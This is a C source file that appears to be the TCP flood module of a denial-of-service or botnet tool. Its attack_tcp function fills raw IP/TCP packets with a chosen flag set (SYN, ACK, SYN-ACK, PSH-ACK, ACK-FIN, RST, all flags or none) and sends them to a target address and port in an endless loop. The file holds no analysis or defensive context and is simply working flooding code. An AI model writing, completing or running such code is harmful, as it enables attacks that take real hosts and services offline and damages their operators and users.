#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "tcp_attack.h"
#include "packet.h"
#include "utils.h"
#include "types.h"

void attack_tcp(struct target_data *target)
{
	char buffer[BUFFER_SIZE];
	struct ip_hdr *iph = (struct ip_hdr *)buffer;
	struct tcp_hdr *tcph = (struct tcp_hdr *)(buffer + sizeof(struct ip_hdr));
	uint8_t flag;

	seed_rand(time(NULL));

	target->addr.sin_family = AF_INET;
	target->addr.sin_port = target->target_port == 0 ? 0 : htons(target->target_port);
	target->addr.sin_addr.s_addr = target->target_addr;
	target->sockfd = init_socket(IPPROTO_TCP);

	if (target->attack_type == ATTACK_TCP_SYN)
		flag = TCP_SYN;
	else if (target->attack_type == ATTACK_TCP_ACK)
		flag = TCP_ACK;
	else if (target->attack_type == ATTACK_TCP_SYNACK)
		flag = TCP_SYN | TCP_ACK;
	else if (target->attack_type == ATTACK_TCP_PSHACK)
		flag = TCP_PSH | TCP_ACK;
	else if (target->attack_type == ATTACK_TCP_ACKFIN)
		flag = TCP_ACK | TCP_FIN;
	else if (target->attack_type == ATTACK_TCP_RST)
		flag = TCP_RST;
	else if (target->attack_type == ATTACK_TCP_ALL)
		flag = TCP_FIN | TCP_SYN | TCP_RST | TCP_PSH | TCP_ACK | TCP_URG;
	else if (target->attack_type == ATTACK_TCP_NULL)
		flag = TCP_NULL;

	while (1) {
		build_ip(iph, sizeof(struct ip_hdr) + sizeof(struct tcp_hdr),
			IPPROTO_TCP, target->target_addr);
		build_tcp(iph, tcph, flag, target->target_port);

		if (sendto(target->sockfd, buffer, iph->length, 0,
				(struct sockaddr *)&target->addr,
				sizeof(struct sockaddr_in)) == -1) {
			exit(EXIT_FAILURE);
		}
	}
}
